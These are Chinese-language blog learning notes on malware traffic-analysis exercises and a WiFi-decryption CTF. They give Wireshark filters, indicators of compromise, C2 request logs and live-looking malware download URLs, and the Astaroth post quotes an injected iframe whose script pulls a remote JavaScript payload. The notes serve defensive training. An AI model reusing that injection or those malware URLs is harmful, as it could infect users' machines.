{"posts":[{"title":"TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT&#39;S GOING ON?)","text":"2020-06-12 - TRAFFIC ANALYSIS EXERCISE - FRANK-N-TED (WHAT’S GOING ON?) 学习记录HTTP流首先查看HTTP流，然后追踪第一条流 提示document被转移，猜测用户访问http://cardboardspaceshiptoys.com/logs/invoice-86495.doc后，又点击https://cardboardspaceshiptoys.com/logs/invoice-86495.doc 随后追踪后两条HTTP流 发现在GET http://205.185.125.104/files/june11.dll后，响应了一个可执行文件 随后对http://snnmnkxdhflwgthqismb.com/post.php进行了一系列POST REQUEST 利用virustotal查询域名snnmnkxdhflwgthqismb.com 在虚拟机中导出.dll文件，并计算其sha256值，并进行查询，其为恶意软件 加密流利用tls.handshake.type eq 1过滤条件查询握手信息，好像没什么信息 线索梳理 Environment（调查的资产信息/环境） LAN segment range:10.6.12.0/24 Domain:frank-n-ted.com Domain controller:frank-n-ted-dc-10.6.12.12 LAN segment gateway:10.6.12.1 LAN segment broadcast address:10.6.12.255 Incident Report Executive summary: LAPTOP-5WKHX9YG的用户frank.brokowski访问http://205.185.125.104/files/june11.dll被感染 Victim details IP address:10.6.12.203 MAC address:Intel_6d:fc:e2 (84:3a:4b:6d:fc:e2) User account name:frank.brokowsk Indicators of compromise (IOCs) SHA256 hash:d36366666b407fe5527b96696377ee7ba9b609c8ef4561fa76af218ddd764dec File size:563,032 字节 File name:june11.dll File location:http://205.185.125.104/files/june11.dll File description:恶意程序 HTTP traffic to retrieve the malware 3302 2020-06-13 01:15:19.658851 10.6.12.203 205.185.125.104 HTTP 205.185.125.104 GET /files/june11.dll HTTP/1.1 http (80) 49739 (49739) 312 Intel_6d:fc:e2 Cisco_29:41:7d HTTP traffic for remote request infection activity 4228 2020-06-13 01:17:09.848132 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49743 (49743) 713 Intel_6d:fc:e2 Cisco_29:41:7d 4237 2020-06-13 01:17:10.374922 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49744 (49744) 749 Intel_6d:fc:e2 Cisco_29:41:7d 4632 2020-06-13 01:17:12.291210 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49747 (49747) 646 Intel_6d:fc:e2 Cisco_29:41:7d 4633 2020-06-13 01:17:12.291276 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49746 (49746) 584 Intel_6d:fc:e2 Cisco_29:41:7d 4638 2020-06-13 01:17:12.291811 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49748 (49748) 579 Intel_6d:fc:e2 Cisco_29:41:7d 4645 2020-06-13 01:17:12.293078 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49749 (49749) 705 Intel_6d:fc:e2 Cisco_29:41:7d 4650 2020-06-13 01:17:12.296081 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49745 (49745) 649 Intel_6d:fc:e2 Cisco_29:41:7d 4813 2020-06-13 01:17:13.261739 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49750 (49750) 638 Intel_6d:fc:e2 Cisco_29:41:7d 5330 2020-06-13 01:17:13.575334 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49751 (49751) 585 Intel_6d:fc:e2 Cisco_29:41:7d 5776 2020-06-13 01:17:14.014885 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49752 (49752) 668 Intel_6d:fc:e2 Cisco_29:41:7d 8359 2020-06-13 01:17:15.790515 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49753 (49753) 816 Intel_6d:fc:e2 Cisco_29:41:7d 8539 2020-06-13 01:17:17.284101 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49754 (49754) 890 Intel_6d:fc:e2 Cisco_29:41:7d 8550 2020-06-13 01:17:18.846653 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49755 (49755) 798 Intel_6d:fc:e2 Cisco_29:41:7d 8562 2020-06-13 01:17:20.377579 10.6.12.203 5.101.51.151 HTTP snnmnkxdhflwgthqismb.com POST /post.php HTTP/1.1 http (80) 49756 (49756) 918 Intel_6d:fc:e2 Cisco_29:41:7d 知识参考FRANK-N-TED (WHAT’S GOING ON?) - Traffic Analysis Train","link":"/20200612-Malware/"},{"title":"TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS","text":"2020-07-31 - TRAFFIC ANALYSIS EXERCISE - TECSOLUTIONS 学习记录HTTP流首先过滤HTTP流并追踪 发现域名e-dsm.com.br返回了一个doc文件 域名jambino.us返回了一个exe可执行文件 随后不断的向201.235.10.215 IP地址POST数据 将doc文件和exe文件导出（注意：请勿在个人电脑上导出，请在虚拟机内导出） 使用binwalk对doc文件进行分析 使用foremost将文件导出，发现有一个ole文件夹和一个zip文件夹，zip文件内为xml文件 计算.ole文件的MD5值，并在virustotal内查询，发现其为木马下载器，那么后续exe文件则为可执行木马程序 计算exe文件的MD5值，并在virustotal内查询，确定其为木马程序 C2流量下载木马程序之后，主机10.7.31.101与主机为201.235.10.215、104.236.52.89:8080交互频繁 加密流无可疑地址 其他流10.7.31.101发出NBNS注册请求到 NBNS 服务器，其计算机名为DESKTOP-DPHW305&lt;20&gt; (Server service) 通过过滤条件kerberos.CNameString来查找账户名称 Kerberos 是一个网络身份验证协议，用于在不安全的网络中安全地验证用户和服务之间的身份。 以下是 Kerberos 协议的工作原理： 认证服务器（AS）：用户向 Kerberos 认证服务器请求访问服务。AS 验证用户的身份，并生成用于与 Ticket Granting Server (TGS) 通信的 Ticket-Granting Ticket (TGT)。TGT 是受加密保护的，只有 TGS 可以解密它。 票证授予服务器（TGS）：用户收到 TGT 后，可以使用它向 TGS 请求访问特定的服务。用户向 TGS 提交 TGT 和服务标识符的请求。TGS 验证用户的 TGT，并生成一个用于访问特定服务的服务票证（Service Ticket）。服务票证也是受加密保护的。 服务请求：用户收到服务票证后，可以将它与服务请求一起发送给服务。服务收到请求后，使用它和自己的密钥解密服务票证。如果票证有效且未被篡改，服务将向用户提供所需的服务。 线索梳理 Environment（调查的资产信息/环境） LAN segment range:10.07.31.0/24 Domain:tecsolutions.info Domain controller:10.07.31.7 LAN segment gateway:10.07.31.1 LAN segment broadcast address:10.07.31.255 Incident Report Executive summary:用户gregory.simmons被木马感染 Victim details（受害者细节） IP address: 10.7.31.101 MAC address: 00:0c:6e:12:af:38 User account name: gregory.simmons Indicators of compromise (IOCs) SHA256 hash:0a3aaa398a6abe7a4ba256812b8b6632fa4595b4ac5c47b459d5a6a911c2d202 File size:913,503 字节 File name:3tknamb7298632293.exe File location:http://jambino.us/tv/DYsPb/ File description:可执行文件 HTTP traffic to retrieve the malware 191 2020-07-31 08:25:37.088661 10.7.31.101 191.6.208.51 HTTP e-dsm.com.br GET /www/ZdJCAB/ HTTP/1.1 http (80) 49737 (49737) 488 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 531 2020-07-31 08:26:19.877245 10.7.31.101 67.20.112.81 HTTP jambino.us GET /tv/DYsPb/ HTTP/1.1 http (80) 49751 (49751) 123 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 HTTP traffic for remote request infection activity 1493 2020-07-31 08:26:34.733614 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /RLVIcVHpdWjKMHfJsK/bhAzHJy/vazwovI5B9BcchWQ/d0EvU2Xl/HQ7AQetdQggMrPULmis/ HTTP/1.1 http (80) 49815 (49815) 414 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 1649 2020-07-31 08:26:56.312136 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /M7aBEffyXE/Upa44JYc0iD8C5Co5qj/QxcEX6A0fDBvDo/ HTTP/1.1 http (80) 49815 (49815) 414 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 1675 2020-07-31 08:26:57.327828 10.7.31.101 104.236.52.89 HTTP 104.236.52.89:8080 POST /y1Oc/CRTtjoStAe/03wHuC/ HTTP/1.1 http-alt (8080) 49817 (49817) 570 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 1842 2020-07-31 08:27:13.551157 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /2lOJG5Lepy9SF/6rmms2u4C61LmFD/hJubcUz/13vVTTA5/kRmZYIUJ67VF1I/GyiwnO6oOQatOesN4K/ HTTP/1.1 http (80) 49815 (49815) 414 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 1881 2020-07-31 08:27:19.007452 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /qKSwAKe1Mi/y5QsEBixxmL45MPHwaD/smvp/78W7iuovnPDTvP2w/10jxRo2zF6M/ HTTP/1.1 http (80) 49815 (49815) 414 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 2003 2020-07-31 08:27:29.328238 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /o9O08G04DzIZG8OWRp/ HTTP/1.1 http (80) 49815 (49815) 414 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 2543 2020-07-31 08:28:12.784950 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /LCWZY47XwmugeO3/3z2TvDhczd/ HTTP/1.1 http (80) 49815 (49815) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 2558 2020-07-31 08:28:12.975985 10.7.31.101 104.236.52.89 HTTP 104.236.52.89:8080 POST /rQDNZBxm3Rpz/YdX3soU3MRPD/fXFnwkKVcXuwwBkpsSq/ HTTP/1.1 http-alt (8080) 49825 (49825) 350 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 2685 2020-07-31 08:28:28.385792 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /aNIce30YT/xzZyFctinQ3Jkn/ HTTP/1.1 http (80) 49815 (49815) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 2697 2020-07-31 08:28:28.655094 10.7.31.101 104.236.52.89 HTTP 104.236.52.89:8080 POST /RaGu/PUTIkmMWtxHtctq/du2EPQGClXV/ HTTP/1.1 http-alt (8080) 49826 (49826) 1490 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 3260 2020-07-31 08:29:21.910776 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /4DsE/ HTTP/1.1 http (80) 49815 (49815) 382 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 3861 2020-07-31 08:43:48.725324 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /NemVGY4zT/f6eDx8v6CbHNUXS/gjuMfPtC/j2SXoNwzJzR/ HTTP/1.1 http (80) 49985 (49985) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 4037 2020-07-31 08:44:31.428936 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /yguqyvZp1YxK083S/H5kIaZFW692xUc/HLuonj6146/ HTTP/1.1 http (80) 49985 (49985) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 4064 2020-07-31 08:44:36.331335 10.7.31.101 104.236.52.89 HTTP 104.236.52.89:8080 POST /xian/balloon/ HTTP/1.1 (application/x-www-form-urlencoded) http-alt (8080) 49987 (49987) 722 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 4178 2020-07-31 08:59:10.832559 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /VmjfI/jygtnUpXR/kxLUe7h097jcjEAJPIM/u8O5/jHD8f/NiJ7CP0jmzegr/ HTTP/1.1 http (80) 49989 (49989) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 4414 2020-07-31 08:59:26.656364 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /FlpErlAFJoc1f77w3J/ HTTP/1.1 http (80) 49989 (49989) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 4574 2020-07-31 09:13:59.964790 10.7.31.101 201.235.10.215 HTTP 201.235.10.215 POST /RoEy0QXUh0/ HTTP/1.1 http (80) 49999 (49999) 366 ASUSTekCOMPU_12:af:38 Cisco_79:48:c2 INVESTIGATION 首先检查http传输的exe可执行文件 发现C2流量 知识DCERPC DCERPC（Distributed Computing Environment Remote Procedure Calls）是一种远程过程调用（RPC）协议，用于在分布式计算环境中进行通信。它最初是由OSF（Open Software Foundation）开发的，后来成为了 DCE（Distributed Computing Environment）标准的一部分。 DRSUAPI DRSUAPI（Directory Replication Service Remote Administration Interface）是用于管理 Windows 活动目录（Active Directory）复制服务的远程管理接口。它提供了一组用于管理和监视活动目录复制的远程过程调用（RPC）接口。 LLMNR LLMNR 是 Link-Local Multicast Name Resolution 的缩写，是一种用于在局域网中进行主机名解析的协议。它通常用于 Windows 系统中，并且是 Windows Vista 及更高版本中的默认网络服务之一。 LDAP LDAP 是 Lightweight Directory Access Protocol 的缩写，是一种用于访问和维护分布式目录服务的协议。它最初是由大学提供的工具和服务的联合开发团队（University of Michigan）开发的，并成为了互联网工程任务组（IETF）的标准协议。 参考TECSOLUTIONS - Traffic Analysis Train 2020-07-31-traffic-analysis-exercise-answers.pdf","link":"/20200731-Malware/"},{"title":"PCAP AND INFO FOR AN ISC DIARY","text":"2020-08-04 - PCAP AND INFO FOR AN ISC DIARY 学习记录HTTP流首先查看http流，并追踪第一条流 发现其传输的是一个可执行程序 查询请求的域名，发现其为恶意地址 导出该文件（注意：请勿在个人电脑中导出，请在虚拟机中导出） 该图片打不开 使用二进制分析攻击binwalk进行分析： 0x0: 这是一个Microsoft可执行文件，采用了可移植执行格式（PE）。 0x457F5: 这是一个bix头部，具有一些元数据信息，包括创建时间、数据地址、入口点等。其OS标记为4.4BSD，名称为”lXD”。 0x56639: 这也是一个bix头部，但这个文件看起来像是固件映像（Firmware Image）。 0x6F484: 这是一个Base64标准索引表。 0x73C70 和 0x73C9F: 这是HTML文档的头部和尾部。 0x74160 和 0x7418F: 这是另一个HTML文档的头部和尾部。 0xC3EE0 和 0xC3F09: 这是一个PNG图像和相应的Zlib压缩数据。 使用foremost分离该文件，得到exe文件和png图片 查看exe文件的md5值，并通过virustotal查询 加密流无可疑流 线索梳理 恶意网站：aromaterapiaclinicabrasil.com.br 恶意文件：87411326.jpg 感染过程：受害者主机10.8.4.101 访问恶意网站aromaterapiaclinicabrasil.com.br后，下载图片形式的恶意文件87411326.jpg，该文件本质是一个exe文件，用excel的图标进行伪装，欺骗用户点击从而感染 知识IGMPv3 IGMPv3（Internet Group Management Protocol version 3）是一种用于在IPv4网络中管理组成员关系的协议。它是IGMP协议的升级版本，主要用于在多播环境下管理主机和路由器之间的通信。 NBNS NBNS（NetBIOS Name Service）是NetBIOS的一部分，用于在局域网中将NetBIOS名（通常是计算机名）解析为IP地址。NetBIOS是一种早期的局域网通信协议，用于在局域网中提供命名、会话和数据共享服务。 参考Pcap and alerts for an ISC diary - Traffic Analysis Train","link":"/20200804-Malware/"},{"title":"TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER","text":"2020-08-21 - TRAFFIC ANALYSIS EXERCISE - PIZZA-BENDER 学习记录HTTP流首先查看HTTP流追踪第一条流，可以看到传输的是一个DLL可执行程序通过virustotal查询访问域名ncznw6a.com，发现该域名存在恶意行为随后请求域名ctldl.windowsupdate.com，IP为8.252.146.254，均返回304。 加密流通过查看TLS流，发现除了知名的域名，存在其他域名如 恶意软件后续是否可以通过软件分析？ 可疑地址 HOST IP ldrbravo.case 45.147.231.132 sieseetera.club 89.44.9.186 ciliabba.cyou 89.44.9.186 ubbifeder.cyou 89.44.9.186 知识LDAP协议 LDAP（轻量级目录访问协议，Lightweight Directory Access Protocol）是一种用于在网络上访问和维护目录服务的协议。目录服务是一种存储和组织信息的分层数据库，通常用于存储用户、组织、设备等信息，并提供快速和有效的检索功能。 KRB5 KRB5 是 Kerberos 5 的缩写，是一种用于网络身份验证的协议。Kerberos 是一种计算机网络身份验证协议，旨在提供强大的身份验证机制，确保只有合法用户能够访问网络资源。 SAMR SAMR（Security Accounts Manager Remote Protocol）是一种用于远程管理 Windows 操作系统用户和组的协议。它允许远程客户端应用程序通过网络与 Windows 系统上的安全账户管理器（SAM）进行通信，从而实现对用户账户、组账户和域账户等的管理操作。 SMB2 SMB2（Server Message Block version 2）是一种用于在计算机网络上共享文件、打印机、串口及其他资源的协议。它是 SMB（Server Message Block）协议的更新版本，旨在提供更快、更安全和更可靠的文件共享服务。 参考PIZZA-BENDER - Traffic Analysis Train","link":"/20200821-Malware/"},{"title":"Finding Gozi - Unit 42 Wireshark Quiz, March 2023","text":"Unit 42 Wireshark Quiz, March 2023 学习记录请求流首先看一下请求流都有啥东西发现一个请求追踪后其请求了zip文件 ZIP文件分析在虚拟机中将zip文件导出其文件内包含了一个URI，该URI是以file为开头的，那么就会产生SMB流量 SMB流量分析那就导出SMB流量传输的文件，发现文件并不是完全的，那就无法分析 感染流量分析查看在请求ZIP文件之后的HTTP流量，发现其又请求了四个rar文件流被加密，无法查看，且传输的是加密过的二进制文件 知识参考Finding Gozi: Answers to Unit 42 Wireshark Quiz, March 2023","link":"/202303-Malware/"},{"title":"Crossing the Line - Unit 42 Wireshark Quiz for RedLine Stealer","text":"Unit 42 Wireshark Quiz for RedLine Stealer 学习记录查看主机名 HTTP流首先查看HTTP 发现没什么东西 其他TCP利用命令tcp.flags eq 0x002 and !(tcp.port eq 443) and !(tcp.port eq 80) and !(ip.dst == 10.7.10.0/24)查看目的地址非局域网的SYN包 发现C2服务器要求受害者主句提供各种类型的用户信息 还有一些其他的KEY 受害者主机传输png图片 将数据下载，查看图片为 还传输了进程信息，主机配置，以及一些登录凭证 知识参考Crossing the Line: Unit 42 Wireshark Quiz for RedLine Stealer","link":"/202307-Malware/"},{"title":"DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION","text":"2024-04-05 (THURSDAY): DATA DUMP FROM ASTAROTH (GUILDMA) MALWARE INFECTION 学习记录HTTP流首先查看HTTP流，并追踪第一条流 返回的HTML代码的作用是在当前页面中嵌入了一个 iframe元素，该 iframe加载了指定的 URL。该 URL 中的参数 searchString 包含了一些JavaScript代码，其中引入了 jQuery库，并加载了另一个JavaScript 文件 123&lt;body style=&quot;margin:0;padding:0;&quot;&gt; &lt;iframe style=&quot;position:relative; top: -104px; left: -141px;width:10;height:10&quot; allowtransparency=&quot;true&quot; src=&quot;https://biosuperdeal.be/index.php?searchString=%3Cscript%20src=%22https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js%22%3E%3C/script%3E%3Cscript%20type=%22text/javascript%22%20src=%22http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.doa_..%22%3E&quot;&gt;&lt;/body&gt; 追踪第二条HTTP流，发现其响应了一个JS代码 这个JS代码的变量名和函数名看起来都是随机生成的 使用了WScript.Shell对象，这通常用于执行系统命令 KUGvzmueVhJnAlPYGL函数用于生成一个值，根据值的不同ykCZgNvJcLaKRUUaoTjd被赋予不同的地址 后面似乎还运行了CMD命令，看起来似乎是恶意代码 将下面流的域名e9h47j3aey4.findbusca.store在上一条流中的地址中查找，发现存在。可能的情况是用户访问了http://eeiufr.neoburst.company/74262421815720Z1iFaTEnQ76IoEzkmhPMkFUzvGd2Vk4o2934293112/Imprimir_DACTEs_73262593.do然后JS代码执行，随后访问了http://e9h47j3aey4.findbusca.store/?77226593077628733 追踪这条流，首先请求服务器返回http://e9h47j3aey4.findbusca.store/?77226593077628733的HTTP标头信息，发现其是.zip文件 同样方法查看，发现其返回了几个.zip文件，分别为gltGlAzqRU.zip、CoAaOeqlDZ.zip、xIARkijOeZ.zip、AyxnzbzCdp.zip，下载后分析（注意：请勿在个人电脑上下载，请在虚拟机内分析） 第一个是一个可执行文件，通过查询其sha256值，发现其为恶意软件 后面这三个不知道是什么东西，剩下的就没什么思路了（有其他的想法请twitter） (以下未完成) 线索梳理 Environment（调查的资产信息/环境） LAN segment range Domain Domain controller LAN segment gateway LAN segment broadcast address Incident Report Executive summary（感染过程总结） Victim details（受害者细节） IP address MAC address User account name Indicators of compromise (IOCs) SHA256 hash File size File name File location File description： HTTP traffic to retrieve the malware 即 下载恶意文件的HTTP流量记录 HTTP traffic for remote request infection activity 即 感染相关的远程请求活动的HTTP流量记录 INVESTIGATION（调查过程） 最后可以给一个精简的流程图 知识参考","link":"/20240405-Malware/"},{"title":"DATA DUMP FROM LATRODECTUS INFECTION","text":"2024-04-09 (TUESDAY): DATA DUMP FROM LATRODECTUS INFECTION 学习记录HTTP流通过命令http.response.code==200查看返回成功的http流量，并逐一追踪 这个交互看起来像是进行了一个 OCSP（在线证书状态协议）查询。在此查询中，客户端请求某个证书的状态，而服务器（ocsp.digicert.com）则返回了该证书的状态信息（即 OCSP 响应） 第二条流请求了证书 第三条流是一个 OPTIONS 请求，用于查询服务器支持的方法。87.249.49.206服务器返回了状态码 200 OK，表示请求成功，并在响应头部中列出了服务器支持的方法，包括 OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK 第四条流是一个 OPTIONS 请求，用于查询87.249.49.206服务器对 /share 资源支持的方法。服务器返回了状态码 200 OK，表示请求成功，并在响应头部中列出了服务器支持的方法，包括 OPTIONS, HEAD, GET, PROPFIND, DELETE, COPY, MOVE, PROPPATCH, LOCK, UNLOCK 第五条流，请求服务器/share/esetond.msi，服务器返回了一个.msi文件 查询域名发现其可能为恶意地址 将.msi文件的sha256值在virustotal中查询，发现其为恶意软件 .MSI文件分析一些恶意代码可能嵌入到.msi文件中，故通过Orca对.MSI文件进行分析，分析方法参考（注意：请勿在个人电脑上分析，请在虚拟机内分析） 其二进制表如下，其中包括exe、jpg、dll以及其他格式的二进制文件 其文件表只包含一个Util.dll文件 组件表是具有用于指定将.cab中存在的文件安装到哪里的功能表 控制表（我猜是用于程序的控制，比如PushButton） CustomAction Table 参考里面说是最重要的表格。（不知道都运行了什么0.0）多数Action运行了aicustact.dll 使用 msi 的注册表功能在注册表键 Software\\[Manufacturer]\\[ProductName]中注册值 没有发现任何线索，可能我的分析方法有问题，如果有任何建议请访问我的twitter，联系我。 利用foremost对msi文件进行分离 查看exe文件的sha256值，并通过virustotal查询，发现其为AIDetectMalware， dll文件未发现问题 加密流在获取.msi文件之前，受害主机和87.249.49.206进行了一段时间的加密通信 问题并没有发现题目里提供的文件（大失败 T T，如果你发现了请联系我twitter） 线索梳理 Environment（调查的资产信息/环境） LAN segment range:10.4.9.0/24 Domain:- Domain controller:10.4.9.1 LAN segment gateway:10.4.9.1 LAN segment broadcast address:10.4.9.255 Incident Report Executive summary:用户被嵌入恶意软件的.msi文件感染 Victim details IP address:10.4.9.101 MAC address:00:26:c7:2f:c6:7e User account name:- Indicators of compromise (IOCs) SHA256 hash:08075e8a6dcc6a5fca089348edbd5fc07b2b0b26a26a46e0dd401121fdaa88d3 File size:1,649,664 字节 File name:esetnod.msi File location:http://kosukeshimura.com/share/esetnod.msi File description:被恶意软件嵌入的.msi文件 HTTP traffic to retrieve the malware 5663 2024-04-10 07:44:29.351877 10.4.9.101 87.249.49.206 HTTP kosukeshimura.com GET /share/esetnod.msi HTTP/1.1 http (80) 50367 (50367) 246 Intel_2f:c6:7e Cisco_30:22:43 知识参考","link":"/20240409-Malware/"},{"title":"被加密的WIFI","text":"2024-04-14 看雪CTF Misc 被加密的WIFI 学习记录WLAN服务介绍WLAN（Wireless Local Area Network，无线局域网）服务是一种无线网络技术，用于在局域网范围内提供无线连接。它通过无线信号传输数据，使设备能够在范围内进行通信和共享资源，而无需使用传统的有线连接 常用术语[1] 客户端带有无线网卡的PC或便携式笔记本电脑等终端 AP（Access Point，接入点）AP提供无线客户端到局域网的桥接功能，在无线客户端与无线局域网之间进行无线到有线和有线到无线的帧转换 AC（Access Controller，无线控制器）无线控制器对无线局域网中的所有AP进行控制和管理。无线控制器还可以通过同认证服务器交互信息，来为WLAN用户提供认证服务 FAT AP一种控制和管理无线客户端的无线设备。帧在客户端和LAN之间传输需要经过无线到有线以及有线到无线的转换，而FAT AP在这个过程中起到了桥梁的作用 无线介质无线介质是用于在无线用户间传输帧的介质。WLAN系统使用无线射频作为传输介质 交互过程[2] WLAN扫描方式 被动扫描： 被动扫描是指无线设备在接收模式下监听无线信道，记录周围所有发送信号的信息。 当设备处于被动扫描模式时，它只是收集附近无线网络的信息，而不发送任何请求。 被动扫描通常用于无线网络管理、监视和数据收集。 主动扫描： 主动扫描是指无线设备发送特殊的扫描请求信号，以搜索附近的无线网络。 在主动扫描中，设备会广播一个扫描请求，周围的无线接入点（AP）会收到请求并回复包含它们的SSID（服务集标识符）和其他信息的信标帧。 设备根据接收到的响应确定可用的无线网络，并显示给用户或自动连接到最适合的网络。 APAP（接入点）作为无线局域网（WLAN）的核心组件之一，每隔一段时间会执行多项任务以确保网络的稳定性、性能和安全性。首先，它会定期广播信标帧，通知附近设备网络的存在和基本信息，帮助设备找到并连接到该网络。同时，AP会监视连接状态和信道质量，定期检查连接设备的状态并维持连接的稳定性，以及监视所在信道的质量并根据需要调整通信参数。此外，AP会定期更新配置信息，从网络管理系统获取最新的设置和安全策略，并执行漫游决策以提供最佳的用户体验。最后，AP还会定期监视网络安全性，确保网络没有异常活动或潜在的安全威胁。综上所述，AP通过执行这些任务，有效地管理和维护 WLAN，以满足用户的需求并提供可靠的无线连接。 广播流量利用命令wlan.fc.type_subtype == 0x08过滤出WLAN流量的广播包 WLAN认证方式 开放系统认证（Open System Authentication）：这是最基本的认证方式，设备可以连接到网络而无需提供任何凭据。它提供了最低级别的安全性，因为任何设备都可以连接到网络。 共享密钥认证（Shared Key Authentication）：在这种认证方式中，接入点要求连接的设备提供与接入点预先共享的密钥进行认证。虽然这比开放系统认证提供了一定程度的安全性，但它已被证明是不安全的，并已不推荐使用。 WPA/WPA2-PSK（Wi-Fi Protected Access Pre-Shared Key）：这是一种基于预共享密钥的个人级别的认证方式。用户在连接到网络之前需要输入预共享密钥（也称为密码）。WPA/WPA2-PSK 提供了更强的安全性，因为通信过程中使用了加密的会话密钥。 WPA/WPA2-PSK（Pre-Shared Key）： 这是个人级别的认证方式，也称为WPA-PSK或WPA2-PSK。 用户需要在连接到网络之前输入预共享密钥（也称为密码）。 预共享密钥用于生成会话密钥，用于加密数据传输。 WPA2-PSK相比WPA-PSK提供了更强大的加密算法，如AES（Advanced Encryption Standard）。 MAC地址过滤：在这种认证方式中，接入点根据设备的MAC地址来控制允许连接到网络的设备。只有在接入点允许的设备MAC地址列表中的设备才能连接到网络。其他方式请自行查询 WLAN关联设备向选择的接入点发送关联请求，请求加入网络，接入点对请求进行身份验证和认证，并在成功后为设备分配IP地址。一旦确认响应收到，关联完成，设备便可以在无线网络中进行数据传输和通信。当接入点（AP）收到关联请求（Association Request）时，首先会验证请求的有效性，包括身份验证信息和认证方式。接着，AP会检查请求中的休眠参数，如Listen Interval，以了解STA的休眠模式，并根据需要处理帧的存储和转发。如果AP有足够的资源来处理新的关联请求，它将为STA分配资源并暂存任何需要发送给STA的帧。然后，AP会发送关联响应（Association Response），如果成功处理了关联请求，它会指示STA可以成功连接到网络。然而，如果AP无法为STA分配足够的资源，它可能会返回一个失败的关联响应，指示连接失败。在处理关联请求时，AP需要平衡资源容量和网络性能，以确保为所有连接的STA提供足够的资源和服务。 WLAN关联成果后四次握手WiFi 四次握手分析 流量分析通过查看HTTP流，发现其传输了密码，博主运气好，只看了一条流，就看到了密码 利用airdecap.ng工具对pcap包进行解密 之后对解密后的包进行分析，看看是不是藏在图片里，或者其他文件里，找了一圈发现没有 那就直接搜索flag，还真有 对flag%7Buse_a_strong_pass%7D进行解码得到flag{use_a_strong_pass}嘿嘿，对了，我还以为很复杂呢，下面这个是在搜索过程中发现的，大家也可以看一看一道关于无线网络和隐写的CTF 参考[1]https://www.h3c.com/cn/d_200812/622875_473262_0.htm[2]https://community.nxp.com/t5/Wireless-Connectivity-Knowledge/802-11-Wi-Fi-Connection-Disconnection-process/ta-p/1121148[3]https://blog.csdn.net/random_run/article/details/115223124","link":"/20240414-Traffic/"},{"title":"CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11","text":"2024-04-15 (MONDAY): CONTACT FORMS CAMPAIGN PUSHES SSLOAD MALWARE AS EARLY AS THURSDAY 2024-04-11 该流量为感染流量 学习记录HTTP流首先看到HTTP为主要流量，且UA为SSLoad也就是题目所提出的SSLOAD恶意软件，可以看出其向HOST为85.239.53.219发出请求，响应了crypted_dll.bin二进制文件随后受害主机便POST自身IP、域名、系统信息等随后又进行了一系列动作后，便保持连接 原作者分析记录INFECTION CHAIN: email generated by contact form of targeted organization’s website –&gt; URL from email –&gt; fake Azure page –&gt; Firebase URL –&gt; downloaded .js file –&gt; user double-clicks .js file, which is run by wscript.exe –&gt; downloads and runs .msi hosted on WebDAV server –&gt; .msi installs and runs SSLoad malware –&gt; SSLoad malware loads and runs encrypted payload –&gt; post-infection checkin traffic EXAMPLE OF URL FROM CONTACT FORM EMAIL SUBMITTED TO VIRUSTOTAL: 